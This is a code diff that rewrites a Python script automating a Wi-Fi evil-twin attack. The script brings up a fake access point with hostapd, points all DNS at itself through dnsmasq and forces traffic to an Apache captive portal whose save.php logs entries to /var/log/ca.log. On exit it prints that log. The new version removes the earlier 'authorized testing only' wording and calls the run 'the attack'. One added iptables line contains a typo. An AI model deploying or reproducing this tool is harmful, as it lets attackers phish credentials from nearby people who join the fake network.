@@ -1,140 +1,126 @@
-import argparse
-import ipaddress
 import os
-import shutil
-import signal
-import subprocess
 import sys
-from pathlib import Path
-
-ETC_DIR = Path('/etc/evil-twin')
-DNSMASQ_CONF = ETC_DIR / 'dnsmasq.conf'
-HOSTAPD_CONF = ETC_DIR / 'hostapd.conf'
-APACHE_SITE = Path('/etc/apache2/sites-available/captive.conf')
-CAPTIVE_DIR = Path('/var/www/captive')
-CAPTIVE_INDEX = CAPTIVE_DIR / 'index.html'
-CAPTIVE_SAVE = CAPTIVE_DIR / 'save.php'
-CAPTIVE_LOG  = Path('/var/log/ca.log')
-
-processes = []  
-iptables_rules = [] 
+import subprocess
+import argparse
+import signal
+import time
+import ipaddress
+import shutil
 
 
-def run(cmd, check=True, capture=False, quiet=False, env=None):
-    """Run a system command. When quiet=True, suppress stdout/stderr unless failing."""
-    if quiet:
-        if os.environ.get('ET_DEBUG'):
-            print(f"[+] $ {' '.join(cmd)}")
-        if capture:
-            return subprocess.run(cmd, check=check, text=True,stdout=subprocess.PIPE, stderr=subprocess.STDOUT, env=env)
-        return subprocess.run(cmd, check=check,stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT, env=env)
-    else:
-        print(f"[+] $ {' '.join(cmd)}")
-        if capture:
-            return subprocess.run(cmd, check=check, text=True,stdout=subprocess.PIPE, stderr=subprocess.STDOUT, env=env)
-        return subprocess.run(cmd, check=check, env=env)
+dnsmasq_proc = None
+hostapd_proc = None
+script_args = None
 
-
-def which(prog):
-    return shutil.which(prog) is not None
-
-def require_root():
-    if os.geteuid() != 0:
-        print("[!] This script must be run as root (sudo). Aborting.")
-        sys.exit(1)
-
-def confirm(prompt: str) -> bool:
+def run_command(command, suppress_output=True):
+    """
+    Executes a shell command.
+    
+    Args:
+        command (list): The command to execute as a list of strings.
+        suppress_output (bool): If True, stdout and stderr will be hidden.
+    
+    Returns:
+        bool: True for success, False for failure.
+    """
     try:
-        ans = input(f"{prompt} [y/N]: ").strip().lower()
-        return ans in ('y','yes')
-    except EOFError:
+        stdout = subprocess.DEVNULL if suppress_output else None
+        stderr = subprocess.DEVNULL if suppress_output else None
+        subprocess.run(command, check=True, stdout=stdout, stderr=stderr)
+        return True
+    except (subprocess.CalledProcessError, FileNotFoundError) as e:
+        print(f"[-] Error executing command: {' '.join(command)}")
+        print(f"[-] Details: {e}")
         return False
 
-
-def ipcalc(network_cidr: str):
-    net = ipaddress.ip_network(network_cidr, strict=False)
-
-    gw_ip = str(list(net.hosts())[-1])
-   
-    hosts = list(net.hosts())
-    if len(hosts) < 50:
-        dhcp_start = hosts[min(5, len(hosts)-2)] 
-        dhcp_end   = hosts[-2]
-    else:
-        dhcp_start = hosts[9]
-        dhcp_end_idx = min(199, len(hosts)-2)
-        dhcp_end   = hosts[dhcp_end_idx]
-    return net, gw_ip, str(dhcp_start), str(dhcp_end)
-
-
-def ensure_packages():
-    pkgs1 = ["apache2","php","libapache2-mod-php"]
-    pkgs2 = ["hostapd","dnsmasq","lighttpd","php"]
-    print("[+] Installing packages…")
-    env = os.environ.copy()
-    env["DEBIAN_FRONTEND"] = "noninteractive"
-
-    run(["apt-get","update","-qq"], quiet=True, env=env)
-    run(["apt-get","install","-y","-qq", *pkgs1], quiet=True, env=env)
-    run(["apt-get","install","-y","-qq", *pkgs2], quiet=True, env=env)
-   
-    for svc in ("hostapd","dnsmasq"):
-        try:
-            run(["systemctl","stop",svc], check=False, quiet=True)
-            run(["systemctl","disable",svc], check=False, quiet=True)
-        except Exception:
-            pass
-  
-    run(["systemctl","start","apache2"], quiet=True)
-    run(["a2enmod","rewrite"], quiet=True)
-    run(["a2enmod","headers"], quiet=True)
-    run(["systemctl","restart","apache2"], quiet=True)
-    print("[+] Packages ready.") 
-
-
-def ensure_iface_exists(iface: str):
-    try:
-        run(["ip","link","show",iface], quiet=True)
-    except subprocess.CalledProcessError:
-        print(f"[!] Interface '{iface}' not found. Aborting.")
+def check_root():
+    """Checks if the script is running with root privileges. Exits if not."""
+    if os.geteuid() != 0:
+        print("[-] This script must be run as root. Please use 'sudo'.")
         sys.exit(1)
-    if iface.startswith('eth'):
-        print(f"[!] '{iface}' looks like a wired interface. For AP mode use a wireless iface (e.g., wlan0/wlp*).")
+    print("[+] Root privileges confirmed.")
 
+def check_dependencies():
+    """Checks for required software packages. Exits if any are missing."""
+    dependencies = ['apache2', 'php', 'hostapd', 'dnsmasq']
+    print("[*] Checking for required packages...")
+    missing = []
+    for dep in dependencies:
+       
+        if subprocess.call(['dpkg-query', '-W', '-f=${Status}', dep], 
+                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) != 0:
+            missing.append(dep)
 
-def config_iface(iface: str, net, gw_ip: str):
-    cidr = net.prefixlen
-    run(["ip","link","set",iface,"down"], quiet=True)
-    run(["ip","addr","flush","dev",iface], quiet=True)
-    run(["ip","addr","add",f"{gw_ip}/{cidr}","dev",iface], quiet=True)
-    run(["ip","link","set",iface,"up"], quiet=True)
+    if missing:
+        print("[-] The following required packages are not installed:")
+        for pkg in missing:
+            print(f"  - {pkg}")
+        print("[-] Please install them manually before running this script.")
+        print("[-] Example: sudo apt update && sudo apt install -y " + " ".join(missing))
+        sys.exit(1)
+    print("[+] All dependencies are installed.")
 
+def configure_interface(iface, network_str):
+    """Configures the network interface with a static IP address."""
+    print(f"[*] Configuring interface {iface}...")
+    try:
+        network = ipaddress.ip_network(network_str)
+        ip_addr = str(next(network.hosts()))
+        
+        commands = [
+            ['ip', 'link', 'set', iface, 'down'],
+            ['ip', 'addr', 'flush', 'dev', iface],
+            ['ip', 'addr', 'add', f"{ip_addr}/{network.prefixlen}", 'dev', iface],
+            ['ip', 'link', 'set', iface, 'up']
+        ]
+        
+        for cmd in commands:
+            if not run_command(cmd):
+                raise Exception(f"Failed to execute: {' '.join(cmd)}")
+                
+        print(f"[+] Interface {iface} configured with IP {ip_addr}")
+        return ip_addr
+    except Exception as e:
+        print(f"[-] Failed to configure interface: {e}")
+        sys.exit(1)
 
-def write_dnsmasq(iface: str, gw_ip: str, dhcp_start: str, dhcp_end: str):
-    ETC_DIR.mkdir(parents=True, exist_ok=True)
-    content = f"""
+def create_dnsmasq_conf(iface, ip_addr, network_str):
+    """Creates the dnsmasq.conf file."""
+    print("[*] Creating dnsmasq.conf...")
+    try:
+        network = ipaddress.ip_network(network_str)
+        # Define DHCP range (e.g., from .10 to .100)
+        dhcp_start = str(network.network_address + 10)
+        dhcp_end = str(network.network_address + 100)
+        
+        config_content = f"""
 interface={iface}
 bind-interfaces
 no-resolv
 log-queries
 
-# DHCP
 dhcp-range={dhcp_start},{dhcp_end},12h
-dhcp-option=3,{gw_ip}
-dhcp-option=6,{gw_ip}
+dhcp-option=3,{ip_addr}
+dhcp-option=6,{ip_addr}
 
-# DNS sinkhole -> captive portal IP
-address=/#/{gw_ip}
-address=/captive.apple.com/{gw_ip}
-address=/www.msftconnecttest.com/{gw_ip}
-address=/connectivitycheck.gstatic.com/{gw_ip}
-""".strip()+"\n"
-    DNSMASQ_CONF.write_text(content)
-    print(f"[+] Wrote {DNSMASQ_CONF}")
+address=/#/{ip_addr}
 
+# --- Captive Portal Redirection ---
+address=/captive.apple.com/{ip_addr}
+address=/www.msftconnecttest.com/{ip_addr}
+address=/connectivitycheck.gstatic.com/{ip_addr}
+"""
+        with open("dnsmasq.conf", "w") as f:
+            f.write(config_content.strip())
+        print("[+] dnsmasq.conf created successfully.")
+    except Exception as e:
+        print(f"[-] Failed to create dnsmasq.conf: {e}")
+        sys.exit(1)
 
-def write_hostapd(iface: str, ssid: str, channel: int):
-    content = f"""
+def create_hostapd_conf(iface, ssid, channel):
+    """Creates the hostapd.conf file."""
+    print("[*] Creating hostapd.conf...")
+    config_content = f"""
 interface={iface}
 driver=nl80211
 ssid={ssid}
@@ -142,31 +128,82 @@ hw_mode=g
 channel={channel}
 auth_algs=1
 wmm_enabled=0
-""".strip()+"\n"
-    HOSTAPD_CONF.write_text(content)
-    print(f"[+] Wrote {HOSTAPD_CONF}")
+"""
+    try:
+        with open("hostapd.conf", "w") as f:
+            f.write(config_content.strip())
+        print("[+] hostapd.conf created successfully.")
+    except Exception as e:
+        print(f"[-] Failed to create hostapd.conf: {e}")
+        sys.exit(1)
 
+def setup_apache():
+    """Starts and configures Apache2."""
+    print("[*] Setting up Apache2...")
+    commands = [
+        ['systemctl', 'start', 'apache2'],
+        ['a2enmod', 'rewrite'],
+        ['a2enmod', 'headers'],
+        ['systemctl', 'restart', 'apache2']
+    ]
+    for cmd in commands:
+        if not run_command(cmd):
+            print(f"[-] Failed to configure Apache. Aborting.")
+            sys.exit(1)
+    print("[+] Apache2 configured and started.")
 
-def setup_captive_folder():
-    if CAPTIVE_DIR.exists():
-        if confirm(f"Folder {CAPTIVE_DIR} exists. Remove and recreate?"):
-            shutil.rmtree(CAPTIVE_DIR)
-        else:
-            print("[i] Leaving existing captive folder in place.")
-    CAPTIVE_DIR.mkdir(parents=True, exist_ok=True)
-    # create empty files if not present
-    CAPTIVE_INDEX.touch(exist_ok=True)
-    CAPTIVE_SAVE.touch(exist_ok=True)
-    print(f"[+] Ensured {CAPTIVE_INDEX} and {CAPTIVE_SAVE} (empty). Add your portal HTML/PHP.")
+def setup_captive_portal_files():
+    """Sets up the captive portal web directory and files."""
+    portal_dir = "/var/www/captive"
+    print(f"[*] Setting up captive portal files in {portal_dir}...")
+    
+    # Check for source files
+    if not os.path.exists("index.html") or not os.path.exists("save.php"):
+        print("[-] Error: 'index.html' and/or 'save.php' not found in the current directory.")
+        print("[-] Please place them alongside the script before running.")
+        sys.exit(1)
+        
+    # Create directory if it doesn't exist
+    if not os.path.exists(portal_dir):
+        print(f"[*] Directory {portal_dir} not found. Creating...")
+        if not run_command(['mkdir', '-p', portal_dir]):
+            sys.exit(1)
+    
+    # Copy files
+    try:
+        print("[*] Copying portal files...")
+        shutil.copy("index.html", os.path.join(portal_dir, "index.html"))
+        shutil.copy("save.php", os.path.join(portal_dir, "save.php"))
+        print("[+] Captive portal files copied successfully.")
+    except Exception as e:
+        print(f"[-] Failed to copy portal files: {e}")
+        sys.exit(1)
 
-    # log file & permissions
-    CAPTIVE_LOG.touch(exist_ok=True)
-    run(["chown","www-data:www-data",str(CAPTIVE_LOG)], quiet=True)
-    run(["chmod","640",str(CAPTIVE_LOG)], quiet=True)
+def setup_log_file():
+    """Creates and sets permissions for the log file."""
+    log_file = "/var/log/ca.log"
+    print(f"[*] Setting up log file {log_file}...")
+    try:
+        if not os.path.exists(log_file):
+            run_command(['touch', log_file])
+        
+        # Get uid and gid for www-data
+        www_data_uid = int(subprocess.check_output(['id', '-u', 'www-data']).strip())
+        www_data_gid = int(subprocess.check_output(['id', '-g', 'www-data']).strip())
+        
+        os.chown(log_file, www_data_uid, www_data_gid)
+        os.chmod(log_file, 0o640)
+        print("[+] Log file permissions set correctly.")
+    except Exception as e:
+        print(f"[-] Failed to set up log file: {e}")
+        sys.exit(1)
 
-
-def write_apache_site():
-    vhost = r"""
+def create_vhost():
+    """Creates the Apache virtual host configuration file."""
+    vhost_file = "/etc/apache2/sites-available/captive.conf"
+    print(f"[*] Creating VirtualHost file: {vhost_file}...")
+    
+    vhost_content = """
 <VirtualHost *:80>
     ServerName captive.portal
     ServerAlias *
@@ -176,170 +213,197 @@ def write_apache_site():
         AllowOverride All
         Require all granted
     </Directory>
-
-    # CNA endpoints
+ 
+    # --- Redirect known captive portal checks ---
     Alias /hotspot-detect.html /var/www/captive/index.html
     Alias /generate_204 /var/www/captive/index.html
     Alias /connecttest.txt /var/www/captive/index.html
-
+   
     RewriteEngine On
     RewriteCond %{REQUEST_URI} !^/save\.php$
     RewriteRule ^.*$ /index.html [L]
 
+    # --- Prevent caching ---
     Header always set Cache-Control "no-store, no-cache, must-revalidate, max-age=0"
     Header always set Pragma "no-cache"
     Header always set Expires "0"
 </VirtualHost>
-""".strip()+"\n"
-    APACHE_SITE.write_text(vhost)
-    print(f"[+] Wrote {APACHE_SITE}")
-    run(["a2ensite","captive.conf"], quiet=True)
-    run(["a2dissite","000-default.conf"], check=False, quiet=True)
-    run(["systemctl","reload","apache2"], quiet=True) 
-
-
-def add_iptables_rules(iface: str):
-    rules = [
-        ["iptables","-t","nat","-A","PREROUTING","-i",iface,"-p","tcp","--dport","80","-j","REDIRECT","--to-ports","80"],
-        ["iptables","-t","nat","-A","PREROUTING","-i",iface,"-p","udp","--dport","53","-j","REDIRECT","--to-ports","53"],
-        ["iptables","-t","nat","-A","PREROUTING","-i",iface,"-p","tcp","--dport","53","-j","REDIRECT","--to-ports","53"],
-    ]
-    for rule in rules:
-        run(rule, quiet=True)
-    iptables_rules.extend(rules)
-    print("[+] Set up iptables")
-
-
-
-def del_iptables_rules():
-    # reverse order when deleting (-D instead of -A)
-    for rule in reversed(iptables_rules):
-        delete = rule.copy()
-        delete[4] = '-D'  # replace -A with -D (index 4 in our construction)
-        try:
-            run(delete, check=False, quiet=True)
-        except Exception:
-            pass
-
-def start_processes():
-    # dnsmasq
-    p_dns = subprocess.Popen(["dnsmasq","-C",str(DNSMASQ_CONF)], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
-    processes.append(("dnsmasq", p_dns))
-    print("[+] Started dnsmasq")
-    # hostapd (foreground)
-    p_apd = subprocess.Popen(["hostapd", str(HOSTAPD_CONF)], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
-    processes.append(("hostapd", p_apd))
-    print("[+] Started hostapd")
-
-
-def tail_process(name, proc):
+"""
     try:
-        for line in proc.stdout:
-            print(f"[{name}] {line}", end='')
-    except Exception:
-        pass
-
-
-def cleanup(iface: str):
-    print("\n[>] Cleaning up…")
-    del_iptables_rules()
-
-    for name, proc in processes:
-        try:
-            print(f"[>] Stopping {name} (pid={proc.pid})")
-            proc.terminate()
-            try:
-                proc.wait(timeout=3)
-            except subprocess.TimeoutExpired:
-                proc.kill()
-        except Exception:
-            pass
-
-    # flush iface
-    try:
-        run(["ip","addr","flush","dev",iface], check=False)
-        run(["ip","link","set",iface,"down"], check=False)
-        run(["ip","link","set",iface,"up"], check=False)
-    except Exception:
-        pass
-    print("[+] Cleanup done.")
-
-
-def main():
-    parser = argparse.ArgumentParser(description="Evil Twin LAB bootstrapper (authorized testing only)")
-    parser.add_argument('-n','--network', required=True, help='CIDR, e.g. 192.168.50.0/24 or 192.168.1.0/23')
-    parser.add_argument('--ssid', required=True, help='SSID to broadcast')
-    parser.add_argument('--channel', type=int, default=6, help='Wi‑Fi channel (2.4GHz)')
-    parser.add_argument('--iface', default='wlan0', help='Wireless interface to use (default: wlan0)')
-    args = parser.parse_args()
-
-    require_root()
-
-    if not which('iptables'):
-        print('[!] iptables not found. Install iptables first.')
+        with open(vhost_file, "w") as f:
+            f.write(vhost_content.strip())
+        print("[+] VirtualHost file created.")
+    except Exception as e:
+        print(f"[-] Failed to create VirtualHost file: {e}")
         sys.exit(1)
 
-    ensure_iface_exists(args.iface)
+def enable_apache_site():
+    """Enables the captive portal site and disables the default."""
+    print("[*] Enabling captive portal Apache site...")
+    commands = [
+        ['a2ensite', 'captive.conf'],
+        ['a2dissite', '000-default.conf'],
+        ['systemctl', 'reload', 'apache2']
+    ]
+    for cmd in commands:
+        if not run_command(cmd):
+            print("[-] Failed to enable Apache site. Aborting.")
+            sys.exit(1)
+    print("[+] Apache site enabled.")
 
-    # 1) packages
-    ensure_packages()
+def setup_iptables(iface):
+    """Sets up iptables rules for redirection."""
+    print("[*] Setting up iptables rules...")
+    commands = [
+        ['iptables', '-t', 'nat', '-A', 'PREROUTING', '-i', iface, '-p', 'tcp', '--dport', '80', '-j', 'REDIRECT', '--to-ports', '80'],
+        ['iptables', '-t', 'nat', '-A', 'PREROUTING', '-i', iface, '-p', 'udp', '--dport', '53', '-j', 'REDIRECT', '--to-ports', '53'],
+        ['iptables', '-t', 'nat', 'A', 'PREROUTING', '-i', iface, '-p', 'tcp', '--dport', '53', '-j', 'REDIRECT', '--to-ports', '53']
+    ]
+    for cmd in commands:
+        if not run_command(cmd):
+            print("[-] Failed to set up iptables. Aborting.")
+            # Attempt to clean up before exiting
+            cleanup(0, 0)
+            sys.exit(1)
+    print("[+] Iptables rules configured.")
 
-    # 2) network math
-    net, gw_ip, dhcp_start, dhcp_end = ipcalc(args.network)
-    print(f"[i] Network: {net} | GW/DNS: {gw_ip} | DHCP: {dhcp_start} → {dhcp_end}")
-
-    # 3) iface config
-    config_iface(args.iface, net, gw_ip)
-
-    # 4) write configs
-    write_dnsmasq(args.iface, gw_ip, dhcp_start, dhcp_end)
-    write_hostapd(args.iface, args.ssid, args.channel)
-
-    # 5) captive + apache vhost
-    setup_captive_folder()
-    write_apache_site()
-
-    # 6) iptables
-    add_iptables_rules(args.iface)
-
+def start_attack():
+    """Kills previous processes and starts dnsmasq and hostapd."""
+    global dnsmasq_proc, hostapd_proc
+    print("[*] Starting the attack...")
     
-    start_processes()
-
-    def handle_sigint(signum, frame):
-        cleanup(args.iface)
-        sys.exit(0)
-
-    signal.signal(signal.SIGINT, handle_sigint)
-    signal.signal(signal.SIGTERM, handle_sigint)
-
-    print("[+] Running. Press Ctrl+C to stop and clean up…\n")
-
-   
+    # Ensure no other dnsmasq is running
+    run_command(['pkill', 'dnsmasq'])
+    time.sleep(1)
+    
     try:
+        print("[*] Starting dnsmasq...")
+        dnsmasq_proc = subprocess.Popen(['dnsmasq', '-C', 'dnsmasq.conf'], 
+                                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         
-        while True:
-            alive = False
-            for name, proc in processes:
-                if proc.poll() is None:
-                    alive = True
-                    
-                    try:
-                        if proc.stdout and not proc.stdout.closed:
-                            while True:
-                                line = proc.stdout.readline()
-                                if not line:
-                                    break
-                                print(f"[{name}] {line}", end='')
-                    except Exception:
-                        pass
-            if not alive:
-                print('[!] Processes exited unexpectedly. Performing cleanup…')
-                break
-    except KeyboardInterrupt:
-        pass
-    finally:
-        cleanup(args.iface)
+        print("[*] Starting hostapd...")
+        # Note: hostapd can be noisy, so redirecting output is good.
+        hostapd_proc = subprocess.Popen(['hostapd', 'hostapd.conf'], 
+                                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        
+        time.sleep(2) # Give processes a moment to start or fail
+        
+        if dnsmasq_proc.poll() is not None:
+            raise Exception("dnsmasq failed to start.")
+        if hostapd_proc.poll() is not None:
+            raise Exception("hostapd failed to start.")
+            
+        print("\n[+] EVIL TWIN IS RUNNING!")
+        print(f"[+] SSID: {script_args.ssid} on Channel: {script_args.channel}")
+        print("[+] Press CTRL+C to stop the attack and clean up.")
+        
+    except Exception as e:
+        print(f"[-] Failed to start attack processes: {e}")
+        cleanup(0, 0)
+        sys.exit(1)
 
+def cleanup(signum, frame):
+    """Cleans up the system upon script termination."""
+    print("\n\n[*] CTRL+C detected. Cleaning up...")
+    
+    # --- Terminate processes ---
+    if dnsmasq_proc:
+        dnsmasq_proc.terminate()
+        print("[*] Terminated dnsmasq.")
+    if hostapd_proc:
+        hostapd_proc.terminate()
+        print("[*] Terminated hostapd.")
+    run_command(['pkill', 'dnsmasq']) # Just in case
 
-if __name__ == '__main__':
+    # --- Clean iptables ---
+    if script_args:
+        print("[*] Removing iptables rules...")
+        rules = [
+            ['-t', 'nat', '-D', 'PREROUTING', '-i', script_args.iface, '-p', 'tcp', '--dport', '80', '-j', 'REDIRECT', '--to-ports', '80'],
+            ['-t', 'nat', '-D', 'PREROUTING', '-i', script_args.iface, '-p', 'udp', '--dport', '53', '-j', 'REDIRECT', '--to-ports', '53'],
+            ['-t', 'nat', '-D', 'PREROUTING', '-i', script_args.iface, '-p', 'tcp', '--dport', '53', '-j', 'REDIRECT', '--to-ports', '53']
+        ]
+        for rule in rules:
+            run_command(['iptables'] + rule)
+
+    # --- Flush interface ---
+    if script_args:
+        print(f"[*] Flushing IP from {script_args.iface}...")
+        run_command(['ip', 'addr', 'flush', 'dev', script_args.iface])
+
+    # --- Handle log file ---
+    log_file = "/var/log/ca.log"
+    if os.path.exists(log_file):
+        print(f"[*] Displaying contents of {log_file}:")
+        try:
+            with open(log_file, "r") as f:
+                print("-" * 40)
+                print(f.read().strip())
+                print("-" * 40)
+        except Exception as e:
+            print(f"[-] Could not read log file: {e}")
+        
+        print(f"[*] Removing {log_file}...")
+        os.remove(log_file)
+        
+    # --- Stop and clean Apache ---
+    print("[*] Stopping Apache2 and cleaning configuration...")
+    run_command(['systemctl', 'stop', 'apache2'])
+    run_command(['a2dissite', 'captive.conf'])
+    run_command(['a2ensite', '000-default.conf'])
+    run_command(['systemctl', 'reload', 'apache2'])
+    if os.path.exists("/etc/apache2/sites-available/captive.conf"):
+        os.remove("/etc/apache2/sites-available/captive.conf")
+
+    # --- Remove captive portal directory ---
+    portal_dir = "/var/www/captive"
+    if os.path.exists(portal_dir):
+        print(f"[*] Removing directory {portal_dir}...")
+        shutil.rmtree(portal_dir)
+
+    # --- Remove local config files ---
+    if os.path.exists("dnsmasq.conf"):
+        os.remove("dnsmasq.conf")
+    if os.path.exists("hostapd.conf"):
+        os.remove("hostapd.conf")
+        
+    print("[+] Cleanup complete. Exiting.")
+    sys.exit(0)
+
+def main():
+    """Main function to orchestrate the setup and attack."""
+    global script_args
+    
+    parser = argparse.ArgumentParser(description="Evil Twin Attack Automation Script")
+    parser.add_argument('--iface', required=True, help="Wireless interface to use (e.g., wlan0)")
+    parser.add_argument('--ssid', required=True, help="SSID for the fake network")
+    parser.add_argument('--channel', required=True, type=int, help="Channel for the network (1-11)")
+    parser.add_argument('--network', required=True, help="Network address in CIDR format (e.g., 192.168.50.0/24)")
+    script_args = parser.parse_args()
+
+    # --- Setup Phase ---
+    check_root()
+    check_dependencies()
+    
+    # Register the cleanup function for SIGINT (Ctrl+C)
+    signal.signal(signal.SIGINT, cleanup)
+    
+    ip_addr = configure_interface(script_args.iface, script_args.network)
+    create_dnsmasq_conf(script_args.iface, ip_addr, script_args.network)
+    create_hostapd_conf(script_args.iface, script_args.ssid, script_args.channel)
+    setup_apache()
+    setup_captive_portal_files()
+    setup_log_file()
+    create_vhost()
+    enable_apache_site()
+    setup_iptables(script_args.iface)
+    
+    # --- Attack Phase ---
+    start_attack()
+    
+    # Keep the script running
+    while True:
+        time.sleep(1)
+
+if __name__ == "__main__":
     main()
